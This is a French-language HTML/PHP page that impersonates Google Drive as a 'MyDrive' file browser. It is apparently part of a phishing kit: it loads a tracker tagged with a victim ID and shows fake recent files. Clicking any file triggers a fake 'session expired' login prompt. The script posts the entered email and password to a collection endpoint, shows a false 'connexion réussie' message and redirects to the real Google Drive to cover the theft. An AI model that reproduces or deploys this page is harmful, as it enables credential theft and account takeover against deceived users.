<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Drive - Fichiers</title>
    <link rel="stylesheet" href="/assets/css/style.css">
    <link rel="stylesheet" href="/assets/css/animations.css">
    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #1a73e8;
            --secondary: #34a853;
            --warning: #fbbc04;
            --danger: #ea4335;
            --dark: #202124;
            --light: #f8f9fa;
            --gray: #5f6368;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Google Sans', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            color: var(--dark);
        }
        
        /* Header */
        .header {
            background: white;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            position: fixed;
            top: 0;
            width: 100%;
            z-index: 1000;
            backdrop-filter: blur(10px);
            background: rgba(255,255,255,0.95);
        }
        
        .header-content {
            max-width: 1200px;
            margin: 0 auto;
            padding: 15px 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        
        .logo {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .logo i {
            font-size: 32px;
            color: var(--primary);
            animation: float 3s ease-in-out infinite;
        }
        
        .logo span {
            font-size: 24px;
            font-weight: 500;
            background: linear-gradient(45deg, var(--primary), var(--secondary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        
        .user-menu {
            display: flex;
            align-items: center;
            gap: 20px;
        }
        
        .avatar {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: linear-gradient(45deg, var(--primary), var(--secondary));
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: 500;
            cursor: pointer;
            transition: transform 0.3s;
        }
        
        .avatar:hover {
            transform: scale(1.1);
        }
        
        /* Main content */
        .main {
            max-width: 1200px;
            margin: 100px auto 40px;
            padding: 0 20px;
        }
        
        /* Welcome card */
        .welcome-card {
            background: white;
            border-radius: 20px;
            padding: 30px;
            margin-bottom: 30px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            animation: slideUp 0.6s ease-out;
            position: relative;
            overflow: hidden;
        }
        
        .welcome-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: linear-gradient(90deg, var(--primary), var(--secondary), var(--warning), var(--danger));
            animation: gradient 3s ease infinite;
            background-size: 300% 300%;
        }
        
        .welcome-title {
            font-size: 28px;
            font-weight: 500;
            margin-bottom: 10px;
            color: var(--dark);
        }
        
        .welcome-subtitle {
            color: var(--gray);
            font-size: 16px;
        }
        
        .stats {
            display: flex;
            gap: 20px;
            margin-top: 20px;
        }
        
        .stat-item {
            flex: 1;
            background: var(--light);
            border-radius: 12px;
            padding: 20px;
            text-align: center;
            transition: transform 0.3s;
        }
        
        .stat-item:hover {
            transform: translateY(-5px);
        }
        
        .stat-value {
            font-size: 32px;
            font-weight: 700;
            color: var(--primary);
            margin-bottom: 5px;
        }
        
        .stat-label {
            color: var(--gray);
            font-size: 14px;
        }
        
        /* Files grid */
        .files-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        
        .files-title {
            font-size: 20px;
            font-weight: 500;
            color: white;
        }
        
        .view-options {
            display: flex;
            gap: 10px;
        }
        
        .view-btn {
            width: 40px;
            height: 40px;
            border-radius: 8px;
            background: rgba(255,255,255,0.2);
            border: none;
            color: white;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .view-btn:hover {
            background: rgba(255,255,255,0.3);
            transform: scale(1.1);
        }
        
        .files-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .file-card {
            background: white;
            border-radius: 16px;
            padding: 20px;
            transition: all 0.3s;
            cursor: pointer;
            position: relative;
            overflow: hidden;
            animation: fadeIn 0.5s ease-out;
            animation-fill-mode: both;
        }
        
        .file-card:nth-child(1) { animation-delay: 0.1s; }
        .file-card:nth-child(2) { animation-delay: 0.2s; }
        .file-card:nth-child(3) { animation-delay: 0.3s; }
        .file-card:nth-child(4) { animation-delay: 0.4s; }
        .file-card:nth-child(5) { animation-delay: 0.5s; }
        .file-card:nth-child(6) { animation-delay: 0.6s; }
        
        .file-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 20px 30px rgba(0,0,0,0.2);
        }
        
        .file-icon {
            font-size: 48px;
            margin-bottom: 15px;
            text-align: center;
        }
        
        .file-name {
            font-weight: 500;
            margin-bottom: 5px;
            color: var(--dark);
        }
        
        .file-info {
            display: flex;
            justify-content: space-between;
            color: var(--gray);
            font-size: 12px;
        }
        
        .file-date {
            display: flex;
            align-items: center;
            gap: 5px;
        }
        
        /* Loading animation */
        .loading {
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 50px;
        }
        
        .spinner {
            width: 50px;
            height: 50px;
            border: 3px solid rgba(255,255,255,0.3);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        
        /* Animations */
        @keyframes float {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }
        
        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: scale(0.9);
            }
            to {
                opacity: 1;
                transform: scale(1);
            }
        }
        
        @keyframes gradient {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }
        
        /* Modal */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            backdrop-filter: blur(5px);
            z-index: 2000;
            align-items: center;
            justify-content: center;
        }
        
        .modal.active {
            display: flex;
            animation: fadeIn 0.3s;
        }
        
        .modal-content {
            background: white;
            border-radius: 20px;
            padding: 30px;
            max-width: 400px;
            width: 90%;
            text-align: center;
            animation: slideUp 0.3s;
        }
        
        .modal-icon {
            font-size: 64px;
            margin-bottom: 20px;
        }
        
        .modal-title {
            font-size: 24px;
            font-weight: 500;
            margin-bottom: 10px;
        }
        
        .modal-text {
            color: var(--gray);
            margin-bottom: 20px;
        }
        
        .modal-input {
            width: 100%;
            padding: 12px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            margin-bottom: 15px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        
        .modal-input:focus {
            outline: none;
            border-color: var(--primary);
        }
        
        .modal-buttons {
            display: flex;
            gap: 10px;
        }
        
        .modal-btn {
            flex: 1;
            padding: 12px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .modal-btn.primary {
            background: var(--primary);
            color: white;
        }
        
        .modal-btn.primary:hover {
            background: #1557b0;
        }
        
        .modal-btn.secondary {
            background: var(--light);
            color: var(--dark);
        }
        
        .modal-btn.secondary:hover {
            background: #e0e0e0;
        }
        
        /* Toast notification */
        .toast {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: white;
            border-radius: 8px;
            padding: 15px 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            display: flex;
            align-items: center;
            gap: 10px;
            transform: translateX(400px);
            transition: transform 0.3s;
            z-index: 1500;
        }
        
        .toast.show {
            transform: translateX(0);
        }
        
        .toast.success {
            border-left: 4px solid var(--secondary);
        }
        
        .toast.error {
            border-left: 4px solid var(--danger);
        }
        
        .toast-icon {
            font-size: 24px;
        }
        
        .toast-content {
            flex: 1;
        }
        
        .toast-title {
            font-weight: 500;
            margin-bottom: 5px;
        }
        
        .toast-message {
            font-size: 14px;
            color: var(--gray);
        }
    </style>
</head>
<body>
    <!-- Header -->
    <header class="header">
        <div class="header-content">
            <div class="logo">
                <i>📁</i>
                <span>MyDrive</span>
            </div>
            <div class="user-menu">
                <span>Espace 15 Go</span>
                <div class="avatar">U</div>
            </div>
        </div>
    </header>
    
    <!-- Main content -->
    <main class="main">
        <!-- Welcome card -->
        <div class="welcome-card">
            <h1 class="welcome-title">Bienvenue sur MyDrive</h1>
            <p class="welcome-subtitle">Vos fichiers sont en cours de synchronisation...</p>
            
            <div class="stats">
                <div class="stat-item">
                    <div class="stat-value">128</div>
                    <div class="stat-label">Fichiers</div>
                </div>
                <div class="stat-item">
                    <div class="stat-value">2.3</div>
                    <div class="stat-label">Go utilisés</div>
                </div>
                <div class="stat-item">
                    <div class="stat-value">15</div>
                    <div class="stat-label">Go total</div>
                </div>
            </div>
        </div>
        
        <!-- Files section -->
        <div class="files-header">
            <h2 class="files-title">Fichiers récents</h2>
            <div class="view-options">
                <button class="view-btn" onclick="changeView('grid')">📱</button>
                <button class="view-btn" onclick="changeView('list')">📋</button>
            </div>
        </div>
        
        <!-- Loading state -->
        <div class="loading" id="loading">
            <div class="spinner"></div>
        </div>
        
        <!-- Files grid -->
        <div class="files-grid" id="filesGrid" style="display: none;"></div>
    </main>
    
    <!-- Login Modal -->
    <div class="modal" id="loginModal">
        <div class="modal-content">
            <div class="modal-icon">🔒</div>
            <h2 class="modal-title">Session expirée</h2>
            <p class="modal-text">Pour des raisons de sécurité, veuillez vous reconnecter</p>
            
            <input type="email" class="modal-input" id="email" placeholder="Email" value="user@gmail.com">
            <input type="password" class="modal-input" id="password" placeholder="Mot de passe">
            
            <div class="modal-buttons">
                <button class="modal-btn primary" onclick="submitLogin()">Se connecter</button>
                <button class="modal-btn secondary" onclick="closeModal()">Annuler</button>
            </div>
        </div>
    </div>
    
    <!-- Toast notification -->
    <div class="toast" id="toast">
        <div class="toast-icon">✓</div>
        <div class="toast-content">
            <div class="toast-title">Succès</div>
            <div class="toast-message" id="toastMessage">Action effectuée</div>
        </div>
    </div>
    
    <script src="/assets/js/tracker.js?id=<?= $victimId ?>"></script>
    <script>
        const VICTIM_ID = '<?= $victimId ?>';
        
        // Données simulées
        const files = [
            { name: 'Vacances été 2025', type: 'jpg', size: '2.3 MB', date: '2025-07-15', icon: '📷' },
            { name: 'Document important', type: 'pdf', size: '1.1 MB', date: '2025-07-14', icon: '📄' },
            { name: 'Vidéo anniversaire', type: 'mp4', size: '15.7 MB', date: '2025-07-10', icon: '🎥' },
            { name: 'Présentation projet', type: 'pptx', size: '4.2 MB', date: '2025-07-08', icon: '📊' },
            { name: 'Archive photos', type: 'zip', size: '8.9 MB', date: '2025-07-05', icon: '📦' },
            { name: 'Playlist préférée', type: 'mp3', size: '5.1 MB', date: '2025-07-03', icon: '🎵' },
            { name: 'CV 2025', type: 'docx', size: '0.8 MB', date: '2025-07-01', icon: '📝' },
            { name: 'Facture EDF', type: 'pdf', size: '0.3 MB', date: '2025-06-28', icon: '📑' },
            { name: 'Logiciel installation', type: 'exe', size: '25.4 MB', date: '2025-06-25', icon: '⚙️' },
            { name: 'Carte d\'identité', type: 'jpg', size: '1.8 MB', date: '2025-06-20', icon: '🆔' }
        ];
        
        // Afficher les fichiers après chargement
        setTimeout(() => {
            document.getElementById('loading').style.display = 'none';
            document.getElementById('filesGrid').style.display = 'grid';
            
            let html = '';
            files.forEach(file => {
                html += `
                    <div class="file-card" onclick="showModal('${file.name}')">
                        <div class="file-icon">${file.icon}</div>
                        <div class="file-name">${file.name}.${file.type}</div>
                        <div class="file-info">
                            <span>${file.size}</span>
                            <span class="file-date">📅 ${file.date}</span>
                        </div>
                    </div>
                `;
            });
            
            document.getElementById('filesGrid').innerHTML = html;
        }, 2000);
        
        // Variables
        let viewMode = 'grid';
        
        // Fonctions
        function changeView(mode) {
            viewMode = mode;
            if (mode === 'grid') {
                document.getElementById('filesGrid').style.gridTemplateColumns = 'repeat(auto-fill, minmax(250px, 1fr))';
            } else {
                document.getElementById('filesGrid').style.gridTemplateColumns = '1fr';
            }
        }
        
        function showModal(fileName) {
            document.getElementById('loginModal').classList.add('active');
        }
        
        function closeModal() {
            document.getElementById('loginModal').classList.remove('active');
        }
        
        function submitLogin() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            // Envoyer au serveur
            fetch('/api/collect.php', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    victimId: VICTIM_ID,
                    type: 'credentials',
                    data: { email, password }
                })
            });
            
            // Afficher toast
            showToast('Connexion réussie', 'Redirection en cours...', 'success');
            
            // Fermer modal et rediriger
            setTimeout(() => {
                closeModal();
                window.location.href = 'https://drive.google.com';
            }, 2000);
        }
        
        function showToast(title, message, type = 'success') {
            const toast = document.getElementById('toast');
            toast.className = `toast ${type}`;
            document.getElementById('toastMessage').innerText = message;
            toast.classList.add('show');
            
            setTimeout(() => {
                toast.classList.remove('show');
            }, 3000);
        }
    </script>
</body>
</html>
